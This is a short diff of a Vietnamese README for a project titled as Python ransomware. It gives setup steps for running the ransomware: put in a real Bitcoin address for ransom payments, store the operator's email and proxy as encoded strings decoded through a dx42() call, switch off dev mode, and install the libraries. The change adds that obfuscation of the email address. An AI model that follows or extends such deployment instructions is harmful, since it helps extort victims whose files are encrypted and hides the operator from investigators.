@@ -24,7 +24,10 @@ Ransomware viết bằng Python 💀💀💀
   YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()
   ```
 * Thay `YOUR_BITCOIN_ADDRESS` bằng địa chỉ Bitcoin thật của bạn.
-* Thay `YOUR_EMAIL_ADDRESS` bằng địa chỉ email thật của bạn.
+* Thay `YOUR_EMAIL_ADDRESS` tương tự bằng địa chỉ email đã mã hoá.
+  ```python
+  YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
+  ```
 * Đặt `dev_mode = False` để tắt chế độ phát triển.
 * Cài đặt các thư viện cần thiết với lệnh:
   ```bash
